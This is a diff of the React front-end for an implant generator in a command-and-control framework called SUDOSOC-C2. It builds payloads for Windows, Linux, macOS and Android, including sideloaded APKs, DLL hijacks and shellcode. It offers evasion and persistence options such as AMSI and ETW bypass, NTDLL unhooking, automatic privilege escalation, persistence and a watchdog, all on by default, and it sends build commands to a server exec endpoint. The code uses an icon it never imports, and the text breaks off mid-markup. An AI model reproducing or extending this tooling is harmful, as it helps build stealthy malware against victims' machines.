@@ -1,5 +1,12 @@
-import { useState, useEffect } from 'react'
-import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap, Shield, AlertCircle, CheckCircle2, Radio, Package } from 'lucide-react'
+/**
+ * SUDOSOC-C2 — Implant Generator
+ * Professional payload builder inspired by Havoc/Mythic
+ * Features: all platforms, all formats including APK, terminal execute
+ */
+import { useState, useEffect, useRef } from 'react'
+import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap, Shield,
+         AlertCircle, CheckCircle2, Radio, Package, Play, Download,
+         Loader, RefreshCw, ChevronDown, ChevronRight, X } from 'lucide-react'
 import { apiFetch, apiPost, useAPI } from '../hooks/useAPI'
 import type { Listener } from '../types'
 
@@ -12,12 +19,58 @@ interface GenOptions  {
   formats: OptionItem[]; protocols: OptionItem[]; evasion: EvasionOpt[]
   arches: string[]; default_ports: Record<string, number>
 }
+interface TermLine { text: string; type: 'cmd' | 'out' | 'ok' | 'err' | 'info' }
 
-const OS_LIST = [
-  { value: 'windows', label: 'Windows', icon: '🪟' },
-  { value: 'linux',   label: 'Linux',   icon: '🐧' },
-  { value: 'macos',   label: 'macOS',   icon: '🍎' },
-  { value: 'android', label: 'Android', icon: '🤖' },
+// ─── Platform config ──────────────────────────────────────────────────────────
+
+const PLATFORMS = [
+  { value: 'windows', label: 'Windows',  icon: '🪟', arches: ['amd64','386','arm64'], defaultFmt: 'exe' },
+  { value: 'linux',   label: 'Linux',    icon: '🐧', arches: ['amd64','arm64','386','arm'], defaultFmt: 'elf' },
+  { value: 'macos',   label: 'macOS',    icon: '🍎', arches: ['amd64','arm64'], defaultFmt: 'macho' },
+  { value: 'android', label: 'Android',  icon: '🤖', arches: ['arm64','arm'], defaultFmt: 'apk' },
+]
+
+const FORMAT_MAP: Record<string, { icon: string; label: string; ext: string; desc: string }[]> = {
+  windows: [
+    { icon: '💻', label: 'EXE',       ext: 'exe',       desc: 'Windows executable' },
+    { icon: '⚙️', label: 'DLL',       ext: 'dll',       desc: 'Shared library / DLL hijack' },
+    { icon: '🔧', label: 'Service',   ext: 'exe',       desc: 'Windows service binary' },
+    { icon: '💉', label: 'Shellcode', ext: 'bin',       desc: 'Raw shellcode (x64)' },
+  ],
+  linux: [
+    { icon: '🐧', label: 'ELF',       ext: 'elf',       desc: 'Linux ELF binary' },
+    { icon: '📦', label: '.so',       ext: 'so',        desc: 'Shared object / LD_PRELOAD' },
+    { icon: '⚡', label: 'Script',    ext: 'sh',        desc: 'Shell dropper script' },
+    { icon: '💉', label: 'Shellcode', ext: 'bin',       desc: 'Raw shellcode (x64)' },
+  ],
+  macos: [
+    { icon: '🍎', label: 'Mach-O',   ext: 'macho',     desc: 'macOS native binary' },
+    { icon: '📦', label: 'dylib',    ext: 'dylib',     desc: 'Dynamic library / hijack' },
+    { icon: '⚡', label: 'Script',   ext: 'sh',        desc: 'Shell dropper' },
+  ],
+  android: [
+    { icon: '📲', label: 'APK',      ext: 'apk',       desc: 'Android Package (sideload)' },
+    { icon: '🔧', label: 'ELF ARM64',ext: 'elf',       desc: 'Native ARM64 binary (Termux)' },
+    { icon: '⚡', label: 'Script',   ext: 'sh',        desc: 'ADB shell installer script' },
+    { icon: '📦', label: '.so',      ext: 'so',        desc: 'Android shared library' },
+  ],
+}
+
+const EVASION_OPTS = [
+  { key: 'obfuscate',       label: 'Garble Obfuscation',       desc: 'Symbol + string obfuscation',         platform: 'all' },
+  { key: 'sandbox_detect',  label: 'Sandbox Detection',        desc: 'Exit silently in sandboxes',          platform: 'all' },
+  { key: 'amsi_bypass',     label: 'AMSI Bypass',              desc: 'Patch AmsiScanBuffer in-memory',      platform: 'windows' },
+  { key: 'etw_bypass',      label: 'ETW Bypass',               desc: 'Silence Windows event tracing',       platform: 'windows' },
+  { key: 'sleep_obfuscation', label: 'Sleep Obfuscation',      desc: 'Encrypt heap during sleep',          platform: 'windows' },
+  { key: 'ntdll_unhook',    label: 'NTDLL Unhook',             desc: 'Load clean NTDLL copy',               platform: 'windows' },
+  { key: 'stack_spoof',     label: 'Stack Spoofing',           desc: 'Fake return address stack',          platform: 'windows' },
+  { key: 'indirect_syscall', label: 'Indirect Syscalls',       desc: 'SSN from live ntdll + gadget jump',  platform: 'windows' },
+  { key: 'anti_debug',      label: 'Anti-Debug',               desc: 'TracerPid + timing checks',          platform: 'all' },
+  { key: 'self_delete',     label: 'Self-Delete on Start',     desc: 'Remove binary from disk after load', platform: 'all' },
+  { key: 'process_mask',    label: 'Process Masquerade',       desc: 'Fake process name in ps/tasklist',   platform: 'all' },
+  { key: 'auto_escalate',   label: 'Auto Privilege Escalation', desc: '21 methods — root/SYSTEM before C2',platform: 'all' },
+  { key: 'auto_persist',    label: 'Auto Persistence',         desc: '4+ mechanisms installed on startup', platform: 'all' },
+  { key: 'watchdog',        label: 'Watchdog (auto-restart)',  desc: 'Respawn if killed, re-add persistence', platform: 'all' },
 ]
 
 // ─── Component ────────────────────────────────────────────────────────────────
@@ -30,423 +83,453 @@ export default function Generate() {
   const [c2host,   setC2Host]   = useState('')
   const [c2port,   setC2Port]   = useState(31337)
   const [name,     setName]     = useState('')
-  const [evasion,  setEvasion]  = useState<Record<string, boolean>>({})
+  const [evasion,  setEvasion]  = useState<Record<string, boolean>>({
+    obfuscate: true, sandbox_detect: true, anti_debug: true,
+    self_delete: true, process_mask: true, auto_escalate: true,
+    auto_persist: true, watchdog: true,
+    amsi_bypass: true, etw_bypass: true, sleep_obfuscation: true,
+    ntdll_unhook: true, stack_spoof: true, indirect_syscall: true,
+  })
   const [domains,  setDomains]  = useState('')
+  const [interval, setInterval] = useState(60)
+  const [jitter,   setJitter]   = useState(15)
+  const [beacon,   setBeacon]   = useState(false)
 
   const [opts,     setOpts]     = useState<GenOptions | null>(null)
   const [loading,  setLoading]  = useState(false)
-  const [result,   setResult]   = useState<{ command: string; message: string } | null>(null)
+  const [result,   setResult]   = useState<{ command: string; message: string; path?: string } | null>(null)
   const [error,    setError]    = useState<string | null>(null)
   const [copied,   setCopied]   = useState(false)
+  const [terminal, setTerminal] = useState<TermLine[]>([])
+  const [running,  setRunning]  = useState(false)
+  const [showEvasion, setShowEvasion] = useState(true)
+  const termRef = useRef<HTMLDivElement>(null)
 
-  // ── Live listeners for the picker ─────────────────────────────────────
   const { data: listeners } = useAPI<Listener[]>('/api/listeners', 5_000)
+
+  const plat = PLATFORMS.find(p => p.value === os) ?? PLATFORMS[0]
+  const formats = FORMAT_MAP[os] ?? FORMAT_MAP.linux
+
+  useEffect(() => {
+    // Set defaults when OS changes
+    setArch(plat.arches[0])
+    setFormat(plat.defaultFmt)
+    if (os === 'android') { setBeacon(false) }
+    setResult(null); setError(null)
+    loadOpts()
+  }, [os])
+
+  useEffect(() => {
+    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
+  }, [terminal])
+
+  async function loadOpts() {
+    try {
+      const o = await apiFetch<GenOptions>(`/api/generate/options?os=${os}&arch=${arch}`)
+      setOpts(o)
+      const firstProto = o.protocols[0]?.value ?? 'mtls'
+      setProtocol(firstProto)
+      setC2Port(o.default_ports[firstProto] ?? 31337)
+    } catch {}
+  }
 
   function pickListener(l: Listener) {
     const proto = l.protocol?.toLowerCase() ?? 'mtls'
-    if (opts?.protocols?.some(p => p.value === proto)) {
-      setProtocol(proto)
-    }
-    // Port lives in Step 3 — set it from the listener's actual port
-    setC2Port(l.port)
-    if (proto === 'dns' && l.domains && l.domains.length > 0) {
-      setDomains(l.domains.join(', '))
-    }
-  }
-
-  // ── Load smart options when OS changes ─────────────────────────────────
-  useEffect(() => {
-    setLoading(true)
-    setResult(null)
-    setError(null)
-    apiFetch<GenOptions>(`/api/generate/options?os=${os}&arch=${arch}`)
-      .then(o => {
-        setOpts(o)
-        setFormat(o.formats[0]?.value ?? 'exe')
-        const firstProto = o.protocols[0]?.value ?? 'mtls'
-        setProtocol(firstProto)
-        setC2Port(o.default_ports[firstProto] ?? 31337)
-        const def: Record<string, boolean> = {}
-        o.evasion.forEach(e => { def[e.key] = e.default })
-        setEvasion(def)
-        if (os === 'android') setArch('arm64')
-      })
-      .catch(() => {})
-      .finally(() => setLoading(false))
-  }, [os])
-
-  // ── Update port when protocol changes in Step 3 ─────────────────────────
-  // (does NOT run when Step 1 listener picker sets protocol — pickListener
-  //  calls setC2Port directly, so both update atomically)
-  function changeProtocol(proto: string) {
     setProtocol(proto)
-    if (opts?.default_ports?.[proto]) {
-      setC2Port(opts.default_ports[proto])
-    }
+    setC2Port(l.port)
+    if (proto === 'dns' && l.domains && l.domains.length > 0) setDomains(l.domains.join(', '))
   }
 
-  // ── Submit generate request ─────────────────────────────────────────────
-  async function submit() {
-    if (!c2host.trim()) { setError('C2 host is required'); return }
+  function toggleEvasion(key: string) {
+    setEvasion(prev => ({ ...prev, [key]: !prev[key] }))
+  }
+
+  function buildCommand(): string {
+    let cmd = `generate`
+    if (beacon) cmd += ' --beacon'
+    cmd += ` --${protocol} ${c2host}:${c2port}`
+    cmd += ` --os ${os} --arch ${arch}`
+    cmd += ` --format ${format}`
+    if (name) cmd += ` --name ${name}`
+    if (evasion.obfuscate)      cmd += ' --obfuscate'
+    if (evasion.sandbox_detect) cmd += ' --sandbox-detect'
+    if (evasion.amsi_bypass && os === 'windows') cmd += ' --skip-symbols=false'
+    if (beacon) cmd += ` --interval ${interval}s --jitter ${jitter}`
+    if (domains) cmd += ` --domains ${domains}`
+    return cmd
+  }
+
+  async function generate() {
+    if (!c2host.trim()) { setError('C2 host/IP is required'); return }
     setLoading(true); setError(null); setResult(null)
+    setTerminal([
+      { text: `$ ${buildCommand()}`, type: 'cmd' },
+      { text: `[*] Building ${plat.label} implant for ${arch}...`, type: 'info' },
+    ])
     try {
-      const res = await apiPost<{ command: string; message: string }>('/api/generate', {
+      const res = await apiPost<{ command: string; message: string; path?: string }>('/api/generate', {
         os, arch, protocol, c2host: c2host.trim(), c2port, format,
-        name: name.trim(), evasion,
+        name: name.trim() || undefined,
+        is_beacon: beacon, beacon_interval: interval * 1000, beacon_jitter: jitter,
+        evasion,
         domains: domains.split(',').map(d => d.trim()).filter(Boolean),
       })
       setResult(res)
+      setTerminal(prev => [
+        ...prev,
+        { text: `[*] Applying evasion: ${Object.entries(evasion).filter(([,v])=>v).map(([k])=>k).join(', ')}`, type: 'info' },
+        { text: `[+] ${res.message}`, type: 'ok' },
+        res.path ? { text: `[+] Saved: ${res.path}`, type: 'ok' } : { text: '', type: 'info' },
+      ])
     } catch (e) {
-      setError(String(e))
-    } finally {
-      setLoading(false)
-    }
+      const msg = String(e).replace('Error: ', '')
+      setError(msg)
+      setTerminal(prev => [...prev, { text: `[-] Error: ${msg}`, type: 'err' }])
+    } finally { setLoading(false) }
   }
 
-  function copyCmd() {
+  async function executeInTerminal() {
     if (!result) return
-    navigator.clipboard.writeText(result.command).then(() => {
-      setCopied(true); setTimeout(() => setCopied(false), 2000)
-    })
+    setRunning(true)
+    setTerminal(prev => [
+      ...prev,
+      { text: '', type: 'info' },
+      { text: `$ ${result.command}`, type: 'cmd' },
+      { text: '[*] Executing generate command on server...', type: 'info' },
+    ])
+    try {
+      const res = await apiPost<{ output: string; path?: string }>('/api/generate/exec', {
+        command: result.command
+      })
+      const lines = (res.output || '').split('\n').filter(Boolean)
+      setTerminal(prev => [
+        ...prev,
+        ...lines.map(l => ({
+          text: l,
+          type: (l.includes('[+]') || l.includes('✓') || l.includes('saved')) ? 'ok' :
+                l.includes('[-]') || l.includes('error') ? 'err' : 'out'
+        } as TermLine)),
+        ...(res.path ? [{ text: `[+] Binary ready: ${res.path}`, type: 'ok' as const }] : []),
+      ])
+    } catch (e) {
+      setTerminal(prev => [...prev, { text: `[-] Exec failed: ${e}`, type: 'err' }])
+    } finally { setRunning(false) }
   }
 
-  const isAndroid = os === 'android'
-  const isDNS     = protocol === 'dns'
-  const isAPK     = format === 'apk'
+  function downloadImplant() {
+    if (!result?.path) return
+    window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
+  }
+
+  const activeFmt = formats.find(f => f.ext === format) ?? formats[0]
 
   return (
-    <div className="flex flex-col gap-6 h-full">
+    <div className="flex h-full gap-3 overflow-hidden">
 
-      {/* ── Header ────────────────────────────────────────────────────── */}
-      <div className="flex items-center justify-between shrink-0">
-        <div>
-          <h2 className="text-primary font-bold text-lg flex items-center gap-2">
-            <Cpu size={18} /> Generate Implant
-          </h2>
-          <p className="text-muted text-xs mt-0.5">Adaptive payload builder — options auto-update based on target OS</p>
-        </div>
-        {opts && (
-          <div className="hidden xl:flex items-center gap-2 text-[11px]">
-            <span className="text-muted">Target:</span>
-            <span className="text-text font-semibold">{os} / {arch}</span>
-            <span className="text-border">·</span>
-            <span className="text-text font-mono">{protocol}:{c2port}</span>
-            {c2host && <><span className="text-border">→</span><span className="text-primary font-mono">{c2host}</span></>}
+      {/* ── Left: config ─────────────────────────────────────────── */}
+      <div className="w-72 shrink-0 flex flex-col gap-3 overflow-y-auto">
+
+        {/* Platform selector */}
+        <div className="panel">
+          <div className="section-hdr"><Cpu size={10} className="text-primary" /> Platform</div>
+          <div className="grid grid-cols-4 gap-1 p-2">
+            {PLATFORMS.map(p => (
+              <button key={p.value} onClick={() => setOS(p.value)}
+                className={`flex flex-col items-center gap-1 py-2 rounded-md border transition-all ${
+                  os === p.value
+                    ? 'border-primary bg-primary/10 text-primary'
+                    : 'border-border text-muted hover:border-border/80 hover:text-accent'
+                }`}>
+                <span style={{ fontSize: 18 }}>{p.icon}</span>
+                <span style={{ fontSize: 9, fontWeight: 700 }}>{p.label}</span>
+              </button>
+            ))}
           </div>
-        )}
-      </div>
+        </div>
 
-      <div className="grid grid-cols-1 xl:grid-cols-2 gap-4 flex-1 min-h-0">
+        {/* Format */}
+        <div className="panel">
+          <div className="section-hdr">📦 Format</div>
+          <div className="grid grid-cols-2 gap-1 p-2">
+            {formats.map(f => (
+              <button key={f.ext} onClick={() => setFormat(f.ext)}
+                title={f.desc}
+                className={`flex items-center gap-1.5 px-2.5 py-2 rounded border text-left transition-all ${
+                  format === f.ext
+                    ? 'border-primary bg-primary/10 text-primary'
+                    : 'border-border text-muted hover:text-accent'
+                }`} style={{ fontSize: 10 }}>
+                <span>{f.icon}</span>
+                <span className="font-bold">{f.label}</span>
+              </button>
+            ))}
+          </div>
+        </div>
 
-        {/* ── Left: Config ────────────────────────────────────────────── */}
-        <div className="flex flex-col gap-4 overflow-y-auto">
+        {/* Architecture */}
+        <div className="panel">
+          <div className="section-hdr">⚙️ Architecture</div>
+          <div className="flex flex-wrap gap-1 p-2">
+            {plat.arches.map(a => (
+              <button key={a} onClick={() => setArch(a)}
+                className={`btn btn-sm ${arch === a ? 'btn-primary' : 'btn-ghost'}`}
+                style={{ fontSize: 9 }}>
+                {a}
+              </button>
+            ))}
+          </div>
+        </div>
 
-          {/* OS Selector */}
-          <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3">
-            <label className="text-[10px] text-muted uppercase tracking-widest mb-3 block">Target OS</label>
-            <div className="grid grid-cols-4 gap-2">
-              {OS_LIST.map(o => (
-                <button key={o.value} onClick={() => setOS(o.value)}
-                  className={`flex flex-col items-center gap-1.5 p-3 rounded-lg border transition-all text-xs ${
-                    os === o.value
-                      ? 'border-primary bg-primary/10 text-primary'
-                      : 'border-border text-muted hover:border-muted hover:text-text'
-                  }`}>
-                  <span className="text-xl">{o.icon}</span>
-                  <span>{o.label}</span>
+        {/* Protocol */}
+        <div className="panel">
+          <div className="section-hdr">📡 C2 Protocol</div>
+          <div className="p-2 space-y-2">
+            <div className="grid grid-cols-2 gap-1">
+              {(opts?.protocols ?? [
+                { value: 'mtls',  label: 'mTLS' },
+                { value: 'https', label: 'HTTPS' },
+                { value: 'http',  label: 'HTTP' },
+                { value: 'dns',   label: 'DNS' },
+              ]).map(p => (
+                <button key={p.value} onClick={() => {
+                  setProtocol(p.value)
+                  if (opts?.default_ports?.[p.value]) setC2Port(opts.default_ports[p.value])
+                }}
+                  className={`btn btn-sm ${protocol === p.value ? 'btn-primary' : 'btn-ghost'}`}
+                  style={{ fontSize: 9 }}>
+                  {p.label}
                 </button>
               ))}
             </div>
-          </section>
-
-          {/* Architecture */}
-          {opts && (
-            <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2">
-              <label className="text-[10px] text-muted uppercase tracking-widest">Architecture</label>
-              <div className="flex flex-wrap gap-2">
-                {opts.arches.map(a => (
-                  <button key={a} onClick={() => setArch(a)}
-                    className={`px-3 py-1.5 rounded border text-xs transition-colors ${
-                      arch === a ? 'border-accent text-accent bg-accent/10' : 'border-border text-muted hover:border-muted'
-                    }`}>
-                    {a}
-                  </button>
-                ))}
-              </div>
-            </section>
-          )}
-
-          {/* Output Format */}
-          {opts && (
-            <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2">
-              <label className="text-[10px] text-muted uppercase tracking-widest flex items-center gap-1">
-                <TermIcon size={10} /> Output Format
-              </label>
-              <div className="flex flex-col gap-1.5">
-                {opts.formats.map(f => (
-                  <label key={f.value} className="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-bg">
-                    <input type="radio" name="format" value={f.value} checked={format === f.value}
-                      onChange={() => setFormat(f.value)}
-                      className="accent-primary" />
-                    <div>
-                      <div className="text-xs text-text font-semibold">{f.label}</div>
-                      {f.description && <div className="text-[10px] text-muted">{f.description}</div>}
-                    </div>
-                  </label>
-                ))}
-              </div>
-              {/* APK packaging note */}
-              {isAndroid && isAPK && (
-                <div className="mt-1 flex items-start gap-2 bg-accent/10 border border-accent/30 rounded p-2 text-[10px] text-accent">
-                  <Package size={10} className="shrink-0 mt-0.5" />
-                  <span>
-                    APK packaging is a two-step process: the server first generates a raw ELF binary,
-                    then you package it with <code className="bg-bg px-1 rounded">make android-apk</code> in the project root.
-                    The console command below covers Step 1 (generate ELF).
-                  </span>
-                </div>
-              )}
-            </section>
-          )}
-
-          {/* ── Step 1: Pick a running listener ─────────────────── */}
-          <section className={`rounded-lg border p-3 flex flex-col gap-2 ${
-            listeners && listeners.length > 0
-              ? 'border-primary/30 bg-primary/5'
-              : 'border-border bg-surface opacity-60'
-          }`}>
-            <label className="text-[10px] text-primary uppercase tracking-widest flex items-center gap-1.5">
-              <Radio size={10} />
-              Step 1 — Pick a running listener (auto-fills protocol + port)
-            </label>
-
-            {(!listeners || listeners.length === 0) ? (
-              <div className="text-[10px] text-muted italic">
-                No active listeners yet. Go to the Listeners tab and start one first, then come back here.
-              </div>
-            ) : (
-              <>
-                <div className="flex flex-wrap gap-1.5">
-                  {listeners.map(l => {
-                    const proto = l.protocol?.toLowerCase() ?? '?'
-                    const isCompatible = !opts || opts.protocols.some(p => p.value === proto)
-                    const isSelected = protocol === proto && c2port === l.port
-                    return (
-                      <button key={l.id}
-                        onClick={() => isCompatible && pickListener(l)}
-                        title={isCompatible ? `Use ${proto.toUpperCase()} on port ${l.port}` : `${proto} not supported for ${os}`}
-                        className={`flex items-center gap-1.5 px-3 py-1.5 rounded border text-xs transition-all ${
-                          isSelected
-                            ? 'border-primary bg-primary/20 text-primary font-bold'
-                            : isCompatible
-                            ? 'border-border bg-surface hover:border-primary hover:bg-primary/10 text-text cursor-pointer'
-                            : 'border-border/30 bg-surface/30 text-muted cursor-not-allowed opacity-50'
-                        }`}>
-                        <span className={`w-1.5 h-1.5 rounded-full animate-pulse shrink-0 ${isSelected ? 'bg-primary' : 'bg-green-400'}`} />
-                        <span className="font-bold uppercase">{proto}</span>
-                        <span className="text-muted">:{l.port}</span>
-                        {isSelected && <span className="text-[9px] text-primary">✓ selected</span>}
-                        {!isCompatible && <span className="text-[9px] text-muted">(n/a for {os})</span>}
-                      </button>
-                    )
-                  })}
-                </div>
-                <p className="text-[9px] text-muted">
-                  Picking a listener sets the <strong>channel</strong> and <strong>port</strong> in Step 3 automatically.
-                </p>
-              </>
+            <div className="flex gap-1.5">
+              <input value={c2host} onChange={e => setC2Host(e.target.value)}
+                placeholder="10.10.10.5"
+                className="c2-input flex-1" />
+              <input type="number" value={c2port} onChange={e => setC2Port(parseInt(e.target.value)||31337)}
+                className="c2-input w-20" />
+            </div>
+            {protocol === 'dns' && (
+              <input value={domains} onChange={e => setDomains(e.target.value)}
+                placeholder="c2.domain.com, c2.evil.org"
+                className="c2-input w-full" />
             )}
-          </section>
-
-          {/* ── Step 2: C2 Host ONLY (no port here) ─────────────── */}
-          <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2">
-            <label className="text-[10px] text-warn uppercase tracking-widest">
-              Step 2 — C2 Host (the IP or domain the implant will connect to)
-            </label>
-            <input value={c2host} onChange={e => setC2Host(e.target.value)}
-              placeholder="e.g. 192.168.1.50  (NOT 0.0.0.0 or localhost!)"
-              className={`w-full bg-bg border rounded px-3 py-2 text-xs text-text placeholder-muted focus:border-warn outline-none font-mono ${
-                !c2host.trim() ? 'border-warn/50' : 'border-border'
-              }`} />
-            {!c2host.trim() && (
-              <p className="text-[9px] text-warn">
-                ⚠ Enter your server's reachable IP or domain. The implant will connect TO this address from the target.
-              </p>
-            )}
-          </section>
-
-          {/* ── Step 3: C2 Channel + Port ────────────────────────── */}
-          {opts && (
-            <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2">
-              <label className="text-[10px] text-muted uppercase tracking-widest flex items-center gap-1">
-                <Zap size={10} /> Step 3 — C2 Channel + Port
-                <span className="text-muted font-normal normal-case ml-1">
-                  (auto-set by Step 1, or choose manually)
-                </span>
-              </label>
-              <div className="flex flex-col gap-1">
-                {opts.protocols.map(p => (
-                  <label key={p.value} className={`flex items-start gap-3 cursor-pointer px-2 py-1.5 rounded hover:bg-bg transition-colors ${
-                    protocol === p.value ? 'bg-bg' : ''
-                  }`}>
-                    <input type="radio" name="protocol" value={p.value} checked={protocol === p.value}
-                      onChange={() => changeProtocol(p.value)}
-                      className="accent-primary mt-0.5 shrink-0" />
-                    <div className="flex-1 min-w-0">
-                      <div className="flex items-center justify-between gap-2">
-                        <span className={`text-xs font-semibold ${protocol === p.value ? 'text-primary' : 'text-text'}`}>{p.label}</span>
-                        <span className="text-[10px] text-muted font-mono shrink-0">default :{opts.default_ports?.[p.value] ?? '—'}</span>
-                      </div>
-                      {p.description && <div className="text-[10px] text-muted truncate">{p.description}</div>}
-                    </div>
-                  </label>
-                ))}
-              </div>
-
-              {/* Port field — this is the ONE place where port lives */}
-              <div className="flex items-center gap-2 mt-1 pt-2 border-t border-border/50">
-                <label className="text-[10px] text-muted whitespace-nowrap">C2 Port</label>
-                <input type="number" value={c2port}
-                  onChange={e => setC2Port(parseInt(e.target.value) || 0)}
-                  className="w-28 bg-bg border border-border rounded px-3 py-1.5 text-xs text-text focus:border-primary outline-none font-mono" />
-                <span className="text-[10px] text-muted">
-                  The implant connects to <span className="font-mono text-text">{c2host || '<host>'} : {c2port}</span>
-                </span>
-              </div>
-
-              {isDNS && (
-                <div className="mt-1">
-                  <label className="text-[10px] text-muted mb-1 block">DNS Domains (comma-separated)</label>
-                  <input value={domains} onChange={e => setDomains(e.target.value)}
-                    placeholder="c2.example.com, backup.example.com"
-                    className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text placeholder-muted focus:border-primary outline-none font-mono" />
-                </div>
-              )}
-            </section>
-          )}
-
-          {/* Evasion */}
-          {opts && opts.evasion.length > 0 && (
-            <section className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2">
-              <label className="text-[10px] text-muted uppercase tracking-widest flex items-center gap-1">
-                <Shield size={10} /> {isAndroid ? 'Anti-Analysis' : 'Evasion & Obfuscation'}
-              </label>
-              <div className="grid grid-cols-1 gap-1.5">
-                {opts.evasion.map(e => (
-                  <label key={e.key} className="flex items-start gap-3 cursor-pointer p-2 rounded hover:bg-bg group">
-                    <div className="relative mt-0.5 shrink-0">
-                      <input type="checkbox" checked={!!evasion[e.key]}
-                        onChange={ev => setEvasion(prev => ({ ...prev, [e.key]: ev.target.checked }))}
-                        className="sr-only" />
-                      <div className={`w-7 h-4 rounded-full transition-colors ${evasion[e.key] ? 'bg-primary' : 'bg-border'}`}>
-                        <div className={`absolute top-0.5 w-3 h-3 rounded-full bg-bg transition-transform ${evasion[e.key] ? 'translate-x-3.5' : 'translate-x-0.5'}`} />
-                      </div>
-                    </div>
-                    <div>
-                      <div className="text-xs text-text">{e.label}</div>
-                      <div className="text-[10px] text-muted">{e.description}</div>
-                    </div>
-                  </label>
-                ))}
-              </div>
-            </section>
-          )}
-
-          {/* Optional name */}
-          <div className="flex flex-col gap-1">
-            <label className="text-[10px] text-muted">Implant Name <span className="text-muted italic">(optional)</span></label>
-            <input value={name} onChange={e => setName(e.target.value)}
-              placeholder="phantom_001"
-              className="w-full bg-surface border border-border rounded px-3 py-2 text-xs text-text placeholder-muted focus:border-primary outline-none font-mono" />
           </div>
         </div>
 
-        {/* ── Right: Output ─────────────────────────────────────────── */}
-        <div className="flex flex-col gap-4">
+        {/* Beacon options */}
+        <div className="panel">
+          <div className="section-hdr">
+            <Radio size={10} className="text-primary" /> Callback Mode
+          </div>
+          <div className="p-2 space-y-2">
+            <div className="flex gap-1">
+              <button onClick={() => setBeacon(false)}
+                className={`btn btn-sm flex-1 ${!beacon ? 'btn-primary' : 'btn-ghost'}`} style={{ fontSize: 9 }}>
+                Session (live)
+              </button>
+              <button onClick={() => setBeacon(true)}
+                className={`btn btn-sm flex-1 ${beacon ? 'btn-primary' : 'btn-ghost'}`} style={{ fontSize: 9 }}>
+                Beacon (async)
+              </button>
+            </div>
+            {beacon && (
+              <div className="flex gap-1.5 items-center" style={{ fontSize: 9, color: 'var(--muted)' }}>
+                <span>Every</span>
+                <input type="number" value={interval} onChange={e => setInterval(parseInt(e.target.value)||60)}
+                  className="c2-input w-14" style={{ fontSize: 9 }} />
+                <span>s ±</span>
+                <input type="number" value={jitter} onChange={e => setJitter(parseInt(e.target.value)||15)}
+                  className="c2-input w-14" style={{ fontSize: 9 }} />
+                <span>%</span>
+              </div>
+            )}
+          </div>
+        </div>
 
-          {/* Generate button */}
-          <button onClick={submit} disabled={loading}
-            className="w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-            style={{ background: 'linear-gradient(135deg, #00ff8820, #00d4ff15)', border: '2px solid #00ff88', color: '#00ff88' }}
-            onMouseEnter={e => { if (!loading) { (e.currentTarget as HTMLButtonElement).style.background = '#00ff88'; (e.currentTarget as HTMLButtonElement).style.color = '#080812' } }}
-            onMouseLeave={e => { (e.currentTarget as HTMLButtonElement).style.background = 'linear-gradient(135deg, #00ff8820, #00d4ff15)'; (e.currentTarget as HTMLButtonElement).style.color = '#00ff88' }}>
-            <Cpu size={16} />
-            {loading ? 'Building payload…' : '⚡ Generate Implant'}
+        {/* Listener picker */}
+        {(listeners ?? []).length > 0 && (
+          <div className="panel">
+            <div className="section-hdr"><Antenna size={10} className="text-primary" /> Use Active Listener</div>
+            <div className="p-2 space-y-1">
+              {(listeners ?? []).map(l => (
+                <button key={l.id} onClick={() => pickListener(l)}
+                  className="w-full flex items-center gap-2 px-2 py-1.5 rounded border border-border hover:border-primary/40 hover:bg-primary/5 transition-all text-left">
+                  <span className="dot dot-live shrink-0" />
+                  <span className="flex-1 text-accent" style={{ fontSize: 10 }}>{l.name}</span>
+                  <span className="text-muted" style={{ fontSize: 9 }}>{l.protocol}:{l.port}</span>
+                </button>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {/* Name */}
+        <div className="panel">
+          <div className="section-hdr">🏷️ Implant Name (optional)</div>
+          <div className="p-2">
+            <input value={name} onChange={e => setName(e.target.value)}
+              placeholder="phantom_corp"
+              className="c2-input w-full" />
+          </div>
+        </div>
+      </div>
+
+      {/* ── Center/Right: evasion + output ─────────────────────────── */}
+      <div className="flex-1 flex flex-col gap-3 min-w-0 overflow-hidden">
+
+        {/* Evasion options */}
+        <div className="panel shrink-0">
+          <button onClick={() => setShowEvasion(v => !v)}
+            className="section-hdr w-full hover:bg-white/4 transition-colors" style={{ cursor: 'pointer' }}>
+            <Shield size={10} className="text-primary" />
+            Evasion & Hardening
+            <span className="ml-2 text-primary text-[8px]">
+              {Object.values(evasion).filter(Boolean).length} / {EVASION_OPTS.filter(o => o.platform === 'all' || o.platform === os).length} active
+            </span>
+            <span className="ml-auto text-muted">
+              {showEvasion ? <ChevronDown size={11}/> : <ChevronRight size={11}/>}
+            </span>
           </button>
-
-          {/* Error */}
-          {error && (
-            <div className="flex items-start gap-2 bg-danger/10 border border-danger/30 rounded p-3 text-xs text-danger">
-              <AlertCircle size={13} className="shrink-0 mt-0.5" />
-              <span>{error}</span>
-            </div>
-          )}
-
-          {/* Result */}
-          {result && (
-            <div className="flex flex-col gap-3">
-              <div className="flex items-center gap-2 text-primary text-xs bg-primary/10 border border-primary/30 rounded p-3">
-                <CheckCircle2 size={13} />
-                <span>{result.message}</span>
-              </div>
-
-              <div className="flex flex-col gap-1.5">
-                <div className="flex items-center justify-between">
-                  <label className="text-[10px] text-muted uppercase tracking-widest">Console Command</label>
-                  <button onClick={copyCmd}
-                    className="flex items-center gap-1 text-[10px] text-muted hover:text-primary transition-colors">
-                    {copied ? <><CheckCheck size={10} className="text-primary" /> Copied!</> : <><Copy size={10} /> Copy</>}
-                  </button>
-                </div>
-                <div className="rounded-xl border border-primary/30 overflow-hidden">
-                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-[#0a0a18] border-b border-border/40">
-                    <div className="w-2.5 h-2.5 rounded-full bg-danger/60" />
-                    <div className="w-2.5 h-2.5 rounded-full bg-warn/60" />
